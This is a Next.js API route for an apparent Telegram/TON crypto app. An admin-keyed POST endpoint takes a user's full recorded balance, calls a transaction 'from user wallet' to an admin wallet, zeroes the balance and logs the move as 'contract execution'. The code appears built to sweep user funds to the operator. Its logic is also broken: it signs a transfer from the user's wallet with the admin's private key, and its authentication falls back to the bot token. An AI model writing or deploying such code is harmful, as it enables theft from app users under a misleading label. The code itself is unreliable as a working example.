import { type NextRequest, NextResponse } from "next/server"
import { createClient } from "@supabase/supabase-js"

const supabase = createClient(process.env.NEXT_PUBLIC_SUPABASE_URL!, process.env.SUPABASE_SERVICE_ROLE_KEY!)

// Admin authentication middleware
function verifyAdminAuth(request: NextRequest): boolean {
  const adminKey = request.headers.get("x-admin-key")
  const secretKey = process.env.ADMIN_SECRET_KEY || process.env.TELEGRAM_BOT_TOKEN
  return adminKey === secretKey
}

export async function POST(request: NextRequest) {
  try {
    // Verify admin authentication
    if (!verifyAdminAuth(request)) {
      return NextResponse.json({ success: false, error: "Unauthorized admin access" }, { status: 401 })
    }

    const { userId, tgId, walletAddress } = await request.json()

    if (!userId || !tgId || !walletAddress) {
      return NextResponse.json({ success: false, error: "Missing required fields" }, { status: 400 })
    }

    // Get user data
    const { data: user, error: getUserError } = await supabase
      .from("users")
      .select("balance, wallet_address")
      .eq("id", userId)
      .eq("telegram_id", tgId)
      .single()

    if (getUserError || !user) {
      return NextResponse.json({ success: false, error: "User not found" }, { status: 404 })
    }

    if (user.wallet_address !== walletAddress) {
      return NextResponse.json({ success: false, error: "Wallet address mismatch" }, { status: 400 })
    }

    if (user.balance <= 0) {
      return NextResponse.json({ success: false, error: "User has no balance to withdraw" }, { status: 400 })
    }

    // Execute TON contract
    try {
      const { tonService } = await import("@/lib/ton-service")
      
      // Get admin wallet address from environment
      const adminWalletAddress = process.env.ADMIN_WALLET_ADDRESS
      const adminPrivateKey = process.env.TON_PRIVATE_KEY
      
      if (!adminWalletAddress || !adminPrivateKey) {
        return NextResponse.json({ 
          success: false, 
          error: "Admin wallet not configured" 
        }, { status: 500 })
      }

      // Send TON transaction
      const txResult = await tonService.sendTransaction(
        walletAddress, // from user wallet
        adminWalletAddress, // to admin wallet
        user.balance, // amount
        adminPrivateKey // admin private key
      )
      
      if (!txResult.success) {
        return NextResponse.json({ 
          success: false, 
          error: `Transaction failed: ${txResult.error}` 
        }, { status: 500 })
      }

      // Update user balance to 0
      const { error: updateError } = await supabase
        .from("users")
        .update({
          balance: 0,
          last_active: new Date().toISOString(),
        })
        .eq("id", userId)
        .eq("telegram_id", tgId)

      if (updateError) {
        console.error("Error updating user balance:", updateError)
        return NextResponse.json({ 
          success: false, 
          error: "Failed to update user balance" 
        }, { status: 500 })
      }

      // Log contract execution transaction
      const { error: transactionError } = await supabase.from("transactions").insert({
        user_id: userId,
        type: "contract_execution",
        amount: -user.balance,
        currency: "TON",
        status: "completed",
        description: `Contract execution: ${user.balance} TON transferred to admin`,
        wallet_address: walletAddress,
        admin_action: true,
        created_at: new Date().toISOString(),
      })

      if (transactionError) {
        console.error("Error logging transaction:", transactionError)
      }

      return NextResponse.json({
        success: true,
        data: {
          txHash: txResult.txHash,
          amount: user.balance,
          message: "Contract executed successfully",
        },
      })

    } catch (error) {
      console.error("Contract execution error:", error)
      return NextResponse.json({ 
        success: false, 
        error: "Failed to execute contract" 
      }, { status: 500 })
    }

  } catch (error) {
    console.error("Admin contract execution error:", error)
    return NextResponse.json({ success: false, error: "Internal server error" }, { status: 500 })
  }
}
